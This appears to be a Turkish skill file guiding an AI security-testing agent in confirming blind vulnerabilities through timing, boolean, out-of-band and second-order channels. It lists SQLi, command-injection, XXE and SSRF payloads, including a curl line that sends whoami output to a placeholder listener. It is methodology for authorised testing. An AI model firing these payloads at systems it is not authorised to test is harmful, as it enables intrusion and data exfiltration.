---
name: oob-blind-confirmation
description: >
  Doğrudan çıktı GÖRMEDEN zafiyeti teyit etme — kıdemli avcının "körde" çalışma sanatı.
  Zaman-tabanlı (sleep/delay), boolean-tabanlı (true/false yanıt farkı), out-of-band
  (DNS/HTTP callback), ve ikinci-derece/stored (bir yere enjekte et, başka yerde tetikle)
  teyit teknikleri. Çıktının yansımadığı durumlar (blind SQLi/SSRF/XXE/RCE/SSTI) burada kazanılır.
---

# 🕶️ KÖR (BLIND) & OUT-OF-BAND TEYİT — çıktı görmeden kanıtla

> **Tek cümle:** Yanıt sana zafiyeti göstermiyorsa, onu DAVRANIŞTAN çıkar: zaman, mantık,
> dış-etkileşim ya da gecikmeli tetikleme. En değerli açıkların çoğu "kör"dür — ekrana
> hiçbir şey yansımaz; usta avcı sapmayı dolaylı kanaldan ölçer.

İlişkili: [[adversarial-verification]] [[baseline-and-signal]] [[out-of-band-testing]]

Çıktı yansımıyor diye "yok" deme. Dört teyit kanalı var; sırayla dene:

---

## 1. ZAMAN-TABANLI (time-based) — en güvenilir in-band kör teyit
Sapmayı GECİKMEYLE ölç. Önce baseline süreyi al, sonra koşullu gecikme enjekte et.

```
SQLi (blind):   ' AND SLEEP(5)--      ·  '||pg_sleep(5)--   ·  ' WAITFOR DELAY '0:0:5'--
                Kanıt: payload'lı istek baseline'dan ~5sn YAVAŞ; 0/2/5sn ile DOĞRUSAL ölçekle.
RCE (blind):    ;sleep 5   ·  $(sleep 5)   ·  `sleep 5`   ·  |ping -c 5 127.0.0.1
SSTI (blind):   gecikme/ağır-işlem primitifi (dile göre).
```
> Kural: TEK gecikme tesadüf olabilir → 0sn / 3sn / 6sn ile **doğrusal artış** göster. Doğrusalsa kanıt.
> Ağ jitter'ını ele: her seviyeyi 2x ölç, medyan al.

## 2. BOOLEAN-TABANLI — doğru/yanlış koşulun yanıtı değiştirmesi
İçerik yansımıyor ama uygulama "true" ve "false" koşula FARKLI tepki veriyor.

```
' AND 1=1--   vs   ' AND 1=2--        → yanıt uzunluğu/status/varlık farkı
id=5          vs   id=5 AND SUBSTRING(version(),1,1)='5'   → koşullu içerik
```
> `cyp_diff_requests` ile iki yanıtı kıyasla: status_differs / length_delta. Tutarlı fark = boolean-blind kanıt.
> Karakter-karakter veri çekme (oracle): doğru tahminde "true" davranışı → veri sızdırma ispatı.

## 3. OUT-OF-BAND (OOB) — uygulama BAŞKA bir yere bağlantı kuruyor
Yanıt hiç değişmese de, payload hedefi DIŞ bir kaynağa istek atmaya zorlayabilir.

```
SSRF (blind):   url=http://<senin-dinleyicin>/   ·   internal metadata (169.254.169.254) yanıt-farkıyla
XXE (blind):    <!ENTITY x SYSTEM "http://<dinleyici>/"> + parametre entity (OOB exfil)
RCE (blind):    ;curl http://<dinleyici>/$(whoami)   ·   nslookup <data>.<dinleyici>
```
> **Bu ortamda harici collaborator olmayabilir.** O zaman: (a) SSRF'i **iç servis yanıt-farkıyla** teyit et
> (açık port vs kapalı port farklı süre/hata; metadata endpoint farklı içerik), (b) zaman-tabanlıya düş
> (erişilemeyen host → timeout gecikmesi). Operatöre OOB altyapısı gerekiyorsa `💡 SİNYAL:` ile bildir.

## 4. İKİNCİ-DERECE / STORED — bir yere enjekte et, BAŞKA yerde tetikle
Enjeksiyon noktası ile yürütme noktası AYRI. Anlık yansıma yok; sonra patlar.

```
Stored XSS:     profil/yorum/isim alanına payload → ADMIN panelinde / başka sayfada render → tetik
Second-order SQLi: kayıt sırasında saklanan değer → sonraki bir sorguda kullanılınca enjekte
Log/email injection: girdi log'a/e-postaya düşüp orada işlenince
```
> Refleks: "Bu girdi NEREDE saklanıp NEREDE tekrar kullanılıyor?" Enjekte et, sonra olası TÜM tetik
> noktalarını ziyaret et. İkinci-derece açıklar en çok kaçırılan ve en yüksek etkili sınıftır.

---

## KARAR / KANIT DİSİPLİNİ
- Kör bulgu da **tekrar-üretilebilir** olmalı (bkz. [[adversarial-verification]]): gecikme doğrusal,
  boolean farkı tutarlı, OOB etkileşimi tekrar gözlenir.
- `verify_note`'a kör-kanalı yaz: "0/3/6sn doğrusal SLEEP gecikmesi" ya da "1=1↔1=2 length_delta=512, 3x tutarlı".
- PoC'a payload'ı VE ölçümü koy (süre tablosu / diff sonucu) — sözle "blind SQLi var" demek YETMEZ.

## ÖZET — 4 KANAL
1. **Zaman**: koşullu sleep, doğrusal ölçekle (0/3/6sn).
2. **Boolean**: 1=1 vs 1=2, diff ile tutarlı fark.
3. **OOB**: dış-bağlantıya zorla; yoksa iç-servis yanıt-farkı / timeout'a düş.
4. **İkinci-derece**: enjekte et, tüm tetik noktalarını ziyaret et (stored/second-order).
